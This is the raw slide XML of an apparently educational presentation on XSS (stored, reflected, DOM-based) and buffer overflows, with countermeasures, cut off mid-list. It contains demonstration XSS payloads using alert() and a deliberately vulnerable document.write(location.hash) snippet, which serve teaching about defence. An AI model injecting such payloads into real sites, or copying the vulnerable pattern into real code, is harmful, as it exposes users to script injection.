            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1347788"/>
            <a:ext cx="7704000" cy="3256161"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-Site Scripting (XSS) exploits poor input validation to inject and execute malicious scripts in user browsers, leading to data theft and security breaches.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Script Injection: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attackers inject malicious scripts into web pages through poorly validated input. Executed scripts can steal user data, such as cookies or session tokens.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Inadequate Validation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Failing to sanitize or escape user input leads to XSS vulnerabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Types of XSS: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Includes Stored, Reflected, and DOM-based XSS, each with different attack vectors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Mitigation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Implement strong input validation, output encoding, and use Content Security Policy (CSP).</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="122834856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20C95-D82A-FEA7-3691-0B268915569F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Stored XSS (Persistent XSS)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B38BBC19-958D-E915-847F-BCAEBC07E49F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="45720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What it is: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The malicious script is </a:t>
            </a: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permanently stored</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on the server (in a database, forum post, or comment section).</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Every time another user views that page, the script executes in their browser.</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Example:</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A comment field in a blog does not sanitize input.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="1600" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:b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Attacker posts: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" kern="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>&lt;script&gt;alert('You are hacked!');&lt;/script&gt;</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Now, whenever any user loads the comments page, the script executes.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600" b="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Impact:</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Can steal session cookies of all visitors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" marR="0" lvl="0" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLs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Can spread worms automatically (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>MySpace</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Samy Worm).</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0979061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D3467-CFD4-6F4E-1311-1AE237C0D5C8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Reflected XSS (Non-Persistent XSS)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D14A9D1F-E5E8-9E88-3EBC-C02108EA43E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>What it is:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The malicious script is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>not stored on the server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>It comes from the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>URL or input field</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> and is immediately reflected back in the web page response.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Requires the victim to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>click a crafted malicious link</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Example: Search results for: &lt;b&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/b&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>A search page displays user input directly:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Malicious link: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" u="sng" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> When the victim clicks it, the script executes in their browser.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Impact:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Often used in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>phishing attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Can redirect victims to malicious websites or steal sensitive data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="45472301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9F085-0883-FEC7-DF39-CD109F02F1BC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>DOM-Based XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7BFBFE76-30A4-CEF1-F818-6906C33E497B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1017724"/>
            <a:ext cx="7704000" cy="4125775"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>What it is:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The vulnerability exists entirely in the client-side JavaScript code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The attack doesn’t rely on server response; instead, it manipulates the Document Object Model (DOM).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>JavaScript code in a web page:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>document.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("Search term: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>location.hash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Attacker sends a malicious link:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>http://example.com/#&lt;script&gt;alert('XSS')&lt;/script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>When the victim opens the link, the JavaScript writes the malicious code into the page, and it executes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Impact:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>More stealthy than stored or reflected XSS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Can manipulate the page dynamically and steal data without server involvement.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7644580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0D73C-1D0B-6BDC-F5B5-1B06381766EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9736CAE-3661-0C86-D7C6-649781099714}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="719999" y="1215750"/>
            <a:ext cx="7784903" cy="4059256"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Input Validation &amp; Sanitization</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Reject unexpected input types (e.g., scripts in text fields).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Remove or encode dangerous characters like &lt;, &gt;, ", ', &amp;.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Output Encoding (Context-Aware Escaping)</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Encode data before rendering in HTML, JavaScript, CSS, or URLs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Example: &lt;script&gt; → &amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>lt;script&amp;gt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>;.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Use Security Libraries/Frameworks</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Use trusted libraries for sanitization (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>OWASP Java Encoder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>DOMPurify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> for JavaScript).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Content Security Policy (CSP)</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Restrict sources of executable scripts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Example: allow only scripts from trusted domains, block inline scripts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t> &amp; Secure Cookies</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Mark cookies as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> to prevent access via JavaScript.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Secure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> flag so cookies are only sent over HTTPS.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="141539878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A6A8D-F5B2-5C69-52CF-FD9A06BCA211}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Buffer Overflow</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83E1CFC7-7783-7B09-E125-EAC1E54BA035}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Buffer overflow is a critical vulnerability where insufficient input validation allows input to exceed memory bounds, potentially leading to arbitrary code execution or system crashes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Memory Overrun: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Occurs when input exceeds allocated buffer size, leading to memory corruption.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Exploitable Vulnerability: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attackers exploit buffer overflows to execute arbitrary code or cause crashes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Poor Validation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Insufficient input validation fails to limit input size, making applications vulnerable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Security Risks: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Can lead to unauthorized access, data corruption, or denial of service (DoS) attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Mitigation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Implement strict input length checks and bounds checking during validation to prevent overflows.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="268958098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5E72E-51B5-3E68-A1D7-8B91BF8B5DDC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{25AA394C-F21D-74CB-7DE4-93B82B0D4EDE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Safe Programming Practices</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Use languages with built-in memory safety (e.g., Java, Python, C#).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Avoid unsafe functions (gets(), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>strcpy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>(), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
